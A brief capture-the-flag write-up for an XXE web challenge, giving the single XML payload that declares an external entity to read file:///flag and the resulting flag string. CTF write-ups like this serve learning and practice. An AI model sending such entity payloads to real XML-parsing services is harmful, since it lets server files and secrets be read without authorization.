![](2023-04-03-10-47-16.png)

Simple XXE Challenge.

Payload: `<?xml version='1.0' encoding='UTF-8'?>  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]> <input><xmen>&xxe;</xmen></input>`

Flag: `RS{XM3N_L0R3?\_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}`
